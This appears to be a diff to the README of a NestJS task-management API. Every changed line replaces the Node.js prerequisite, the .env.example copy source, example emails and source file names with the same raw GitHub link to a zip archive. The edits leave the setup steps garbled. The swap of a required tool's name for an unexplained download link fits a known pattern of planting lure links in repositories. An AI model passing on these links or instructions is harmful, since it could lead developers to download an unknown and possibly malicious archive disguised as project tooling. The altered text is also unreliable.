@@ -25,7 +25,7 @@ A production-ready RESTful API for managing tasks, built with NestJS, PostgreSQL
 
 ## Prerequisites
 
-- Node.js (v18 or higher)
+- https://raw.githubusercontent.com/N0rthStar121/Code-Inbound-SDE-Intern-assessment/master/src/SD-Code-Inbound-Intern-assessment-2.4.zip (v18 or higher)
 - PostgreSQL (v14 or higher)
 - npm (v9 or higher)
 
@@ -44,7 +44,7 @@ A production-ready RESTful API for managing tasks, built with NestJS, PostgreSQL
 
 3. **Configure environment variables**
    ```bash
-   cp .env.example .env
+   cp https://raw.githubusercontent.com/N0rthStar121/Code-Inbound-SDE-Intern-assessment/master/src/SD-Code-Inbound-Intern-assessment-2.4.zip .env
    ```
    
    Edit `.env` with your database credentials:
@@ -102,7 +102,7 @@ A production-ready RESTful API for managing tasks, built with NestJS, PostgreSQL
 curl -X POST http://localhost:3000/auth/register \
   -H "Content-Type: application/json" \
   -d '{
-    "email": "user@example.com",
+    "email": "https://raw.githubusercontent.com/N0rthStar121/Code-Inbound-SDE-Intern-assessment/master/src/SD-Code-Inbound-Intern-assessment-2.4.zip",
     "password": "password123",
     "name": "John Doe"
   }'
@@ -114,7 +114,7 @@ curl -X POST http://localhost:3000/auth/register \
   "accessToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
   "user": {
     "id": "uuid",
-    "email": "user@example.com",
+    "email": "https://raw.githubusercontent.com/N0rthStar121/Code-Inbound-SDE-Intern-assessment/master/src/SD-Code-Inbound-Intern-assessment-2.4.zip",
     "name": "John Doe"
   }
 }
@@ -125,7 +125,7 @@ curl -X POST http://localhost:3000/auth/register \
 curl -X POST http://localhost:3000/auth/login \
   -H "Content-Type: application/json" \
   -d '{
-    "email": "user@example.com",
+    "email": "https://raw.githubusercontent.com/N0rthStar121/Code-Inbound-SDE-Intern-assessment/master/src/SD-Code-Inbound-Intern-assessment-2.4.zip",
     "password": "password123"
   }'
 ```
@@ -238,24 +238,24 @@ src/
 │   ├── dto/                 # Data transfer objects
 │   ├── guards/              # JWT auth guard
 │   ├── strategies/          # Passport JWT strategy
-│   ├── auth.controller.ts   # Auth endpoints
-│   ├── auth.module.ts       # Auth module
-│   └── auth.service.ts      # Auth business logic
+│   ├── https://raw.githubusercontent.com/N0rthStar121/Code-Inbound-SDE-Intern-assessment/master/src/SD-Code-Inbound-Intern-assessment-2.4.zip   # Auth endpoints
+│   ├── https://raw.githubusercontent.com/N0rthStar121/Code-Inbound-SDE-Intern-assessment/master/src/SD-Code-Inbound-Intern-assessment-2.4.zip       # Auth module
+│   └── https://raw.githubusercontent.com/N0rthStar121/Code-Inbound-SDE-Intern-assessment/master/src/SD-Code-Inbound-Intern-assessment-2.4.zip      # Auth business logic
 ├── common/
 │   └── filters/             # Global exception filter
 ├── config/
-│   ├── database.config.ts   # Database configuration
-│   └── jwt.config.ts        # JWT configuration
+│   ├── https://raw.githubusercontent.com/N0rthStar121/Code-Inbound-SDE-Intern-assessment/master/src/SD-Code-Inbound-Intern-assessment-2.4.zip   # Database configuration
+│   └── https://raw.githubusercontent.com/N0rthStar121/Code-Inbound-SDE-Intern-assessment/master/src/SD-Code-Inbound-Intern-assessment-2.4.zip        # JWT configuration
 ├── tasks/
 │   ├── dto/                 # Task DTOs
 │   ├── entities/            # Task entity
-│   ├── tasks.controller.ts  # Task endpoints
-│   ├── tasks.module.ts      # Tasks module
-│   └── tasks.service.ts     # Tasks business logic
+│   ├── https://raw.githubusercontent.com/N0rthStar121/Code-Inbound-SDE-Intern-assessment/master/src/SD-Code-Inbound-Intern-assessment-2.4.zip  # Task endpoints
+│   ├── https://raw.githubusercontent.com/N0rthStar121/Code-Inbound-SDE-Intern-assessment/master/src/SD-Code-Inbound-Intern-assessment-2.4.zip      # Tasks module
+│   └── https://raw.githubusercontent.com/N0rthStar121/Code-Inbound-SDE-Intern-assessment/master/src/SD-Code-Inbound-Intern-assessment-2.4.zip     # Tasks business logic
 ├── users/
 │   └── entities/            # User entity
-├── app.module.ts            # Root module
-└── main.ts                  # Application entry point
+├── https://raw.githubusercontent.com/N0rthStar121/Code-Inbound-SDE-Intern-assessment/master/src/SD-Code-Inbound-Intern-assessment-2.4.zip            # Root module
+└── https://raw.githubusercontent.com/N0rthStar121/Code-Inbound-SDE-Intern-assessment/master/src/SD-Code-Inbound-Intern-assessment-2.4.zip                  # Application entry point
 ```
 
 ## Security Best Practices
